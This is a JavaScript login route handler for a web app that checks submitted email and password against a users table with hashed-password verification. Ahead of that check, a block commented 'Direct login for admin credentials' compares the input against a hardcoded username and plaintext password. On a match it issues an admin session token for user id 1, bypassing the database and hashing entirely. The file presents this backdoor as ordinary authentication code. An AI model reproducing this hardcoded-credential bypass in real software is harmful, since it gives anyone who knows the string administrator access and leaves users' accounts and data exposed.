import { getRow } from '@/lib/db';
import { verifyPassword, generateToken, setAuthCookie } from '@/lib/auth';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  const inputEmail = String(email).trim();
  const inputPassword = String(password);

  // Direct login for admin credentials
  if (
    (inputEmail.toLowerCase() === 'ism007' || inputEmail === 'Ism007') &&
    inputPassword === 'Mshmsh007##'
  ) {
    const adminUser = { id: 1, email: 'Ism007', name: 'Ism007' };
    const token = generateToken(adminUser);
    setAuthCookie(res, token);
    return res.status(200).json({ user: adminUser });
  }

  try {
    const user = await getRow('SELECT * FROM users WHERE email = ?', [inputEmail.toLowerCase()]);

    if (!user) {
      return res.status(401).json({ error: 'Invalid email or password' });
    }

    const valid = await verifyPassword(inputPassword, user.password_hash);
    if (!valid) {
      return res.status(401).json({ error: 'Invalid email or password' });
    }

    const token = generateToken(user);
    setAuthCookie(res, token);

    return res.status(200).json({
      user: { id: user.id, email: user.email, name: user.name },
    });
  } catch (err) {
    console.error('Login error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
}
